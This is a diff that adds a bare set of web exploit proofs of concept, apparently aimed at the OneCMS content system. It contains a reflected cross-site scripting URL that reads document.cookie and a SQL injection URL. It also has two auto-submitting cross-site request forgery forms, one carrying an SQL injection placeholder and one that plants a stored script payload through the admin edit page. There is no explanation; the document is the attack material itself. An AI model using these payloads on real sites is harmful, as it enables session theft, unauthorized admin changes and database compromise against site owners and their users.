@@ -1,0 +1,26 @@
+http://www.example.com/admin/admin.php?cat=cheats%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+&lt;form action=&quot;http://www.example.com/search.php?view=forums&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;search&quot; value=&quot;1+any sql&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+http://www.example.com/index.php?load=af&view=click&id=3'+any sql
+
+&lt;form action=&quot;http://www.example.com/admin/admin.php?view=manage&edit=2&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id[]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cat_1&quot; value=&quot;news&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;name_1&quot; value=&quot;OneCMS News title&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;lev_1&quot; value=&quot;No&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Full1&quot; value=&quot;news full text&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;systems1&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;games1&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Short1&quot; value='short&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;image1&quot; value=&quot;&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;Add&quot; value=&quot;Submit Changes&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
